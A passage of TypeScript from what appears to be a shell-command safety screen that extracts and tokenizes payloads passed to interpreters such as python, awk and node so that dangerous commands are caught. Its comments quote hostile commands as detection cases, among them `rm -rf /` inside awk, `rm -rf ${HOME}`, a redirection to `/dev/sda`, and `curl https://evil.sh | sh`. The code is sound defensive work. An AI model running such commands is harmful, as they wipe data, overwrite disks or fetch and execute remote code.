    const inner = stripOneQuoteLayer(raw);
    if (inner !== args[k] && inner.includes('\\\n')) out.push(inner);
  }
  return out;
}

/** The raw spelling of the operand `shellPayload` selected, when it differs. */
function codeRawPayload(args: string[], rawArgs: Array<string | undefined>, payload: string): string | undefined {
  const ci = args.findIndex((a) => /^-[A-Za-z]*c[A-Za-z]*$/.test(a));
  if (ci === -1) return undefined;
  for (let k = ci + 1; k < args.length; k += 1) {
    if (args[k] === '--') continue;
    const raw = rawArgs[k];
    if (raw === undefined) return undefined;
    const inner = stripOneQuoteLayer(raw);
    return inner !== payload && inner.includes('\\\n') ? inner : undefined;
  }
  return undefined;
}

function shellPayload(args: string[]): string | undefined {
  const ci = args.findIndex((a) => /^-[A-Za-z]*c[A-Za-z]*$/.test(a));
  if (ci === -1) return undefined;
  for (let k = ci + 1; k < args.length; k += 1) {
    if (args[k] === '--') continue;
    return args[k];
  }
  return undefined;
}

/**
 * Programs that execute a program text given on the command line.
 *
 * F-2c-42 - the `awk` family belongs here rather than in `COMMAND_CARRIERS`:
 * its program is a POSITIONAL operand in a language this screen does not model,
 * which is exactly what the foreign-code tokenization is for.
 * `awk 'BEGIN{system("rm -rf /")}'` executes, and 0.6.0 refused it.
 */
export const INTERPRETERS = new Set([
  'python', 'python2', 'python3', 'perl', 'ruby', 'node', 'php', 'bun', 'deno',
  'awk', 'gawk', 'mawk', 'nawk',
]);

/** The flags those programs use for "the next argument is the program". */
export const INTERPRETER_CODE_FLAGS = new Set(['-c', '-e', '-r', '-p', '--eval', '--exec', '--command']);

function interpreterPayload(args: string[]): string | undefined {
  const ci = args.findIndex((a) => INTERPRETER_CODE_FLAGS.has(a));
  if (ci === -1) return undefined;
  return args[ci + 1];
}

/**
 * Candidate commands read out of a payload in a language this screen does not
 * model. Tokenised on whitespace AND on the punctuation that cannot occur
 * inside a command word (brackets, quotes, commas, semicolons), then every
 * suffix is offered as an argv - the same "we do not know which token is the
 * command" rule the unconfident fallback applies.
 */
function foreignCodeCommands(payload: string): SimpleCommand[] {
  // F-2c-42 - A `${VAR}` EXPANSION IS ONE WORD, AND THE SPLITTER WAS
  // CUTTING IT IN HALF. `{` and `}` are punctuation in the languages this
  // tokenizes (`BEGIN{…}`, a python dict), so they are splitters - but they are
  // also the braces of a shell expansion, and splitting there turned the
  // payload `rm -rf ${HOME}` into the tokens `rm · -rf · $ · HOME`, leaving no
  // operand that names anything dangerous. Measured after the interpreter arm
  // was widened: 338 of the 366 remaining escapes were this one shape, and
  // every one of them a target the screen blocks perfectly well when it is
  // handed the whole word. The spans are masked before the split and restored
  // after it, so the punctuation reading is unchanged everywhere else.
  // The mask is U+0001: it is in none of the splitter classes and cannot
  // occur in a shell command line, so masking can neither create a token
  // boundary nor destroy one. A SPACE would have been read by the splitter.
  const MASK = '\u0001';
  const spans: string[] = [];
  const masked = payload.replace(/\$\{[^}]*\}/g, (m) => `${MASK}${spans.push(m) - 1}${MASK}`);
  const tokens = masked
    .split(/[\s()[\]{},;'"`]+/)
    .filter((t) => t.length > 0)
    .map((t) => t.replace(/\u0001(\d+)\u0001/g, (_, k: string) => spans[Number(k)] as string));
  // F-2c-42 - AND THE CONSERVATIVE READING, BECAUSE A TOKEN LIST HAS NO
  // REDIRECTIONS AND THREE RULES ONLY EXIST INSIDE ONE.
  //
  // The suffix list below sets `redirects: []` and `terminator: null`, so
  // `python3 -c "os.system('echo x > /dev/sda')"` offered the words
  // `echo · x · > · /dev/sda` with `>` as an ordinary token - and the two rules
  // that read `cmd.redirects` (raw device, sensitive file) could never fire.
  // Measured: after the interpreter arm was widened, **312 of the 338 remaining
  // escapes were exactly this**, every one a redirection core.
  //
  // THIS IS THE SAME DEFECT F-2c-40 FIXED IN `conservativeCommands` AND
  // F-2c-30 FIXED IN THE CARRIER ARM - *a candidate tokenization must preserve
  // the STRUCTURE, not only the words* - standing at the third of the three
  // sites that build one. So rather than re-deriving redirection handling here,
  // the payload is also offered through `conservativeCommands`, which already
  // models it. One implementation, three callers.
  const out: SimpleCommand[] = [...conservativeCommands(payload)];
  const word = (v: string): ShellWord => ({ value: v, raw: v, quoted: false });

  // AND THE PIPE IS A TERMINATOR, NOT A WORD - the third face of the same
  // defect, in the same function. `|` is absent from the punctuation splitter,
  // so a payload of `curl https://evil.sh | sh` produced ONE candidate whose
  // words were `curl · https://evil.sh · | · sh` with `terminator: null`. The
  // download-into-a-shell rule is the one rule that reads more than a single
  // command - it asks what the NEXT stage is - so it could never fire, and
  // **all 86 shapes that survived the two fixes above were exactly these
  // cores.** F-2c-30 measured 24 shapes on this cause in the carrier arm and
  // F-2c-40 measured 9 in the conservative arm; this is the third site.
  const stages: string[][] = [[]];
  for (const t of tokens) {
    if (t === '|') stages.push([]);
    else (stages[stages.length - 1] as string[]).push(t);
  }
  const stageCmd = (toks: string[], k: number): SimpleCommand => ({
    assignments: [],
    words: toks.map(word),
    redirects: [],
    redirectOps: [],
    terminator: k < stages.length - 1 ? '|' : null,
  });
  const downstream = stages.map((toks, k) => stageCmd(toks, k));
  for (let k = 0; k < stages.length; k += 1) {
    const toks = stages[k] as string[];
    for (let start = 0; start < toks.length; start += 1) {
      out.push(stageCmd(toks.slice(start), k));
      // The stages AFTER this one, so the sequence survives the suffixing.
      if (k < stages.length - 1) out.push(...downstream.slice(k + 1));
    }
  }
  return out;
}
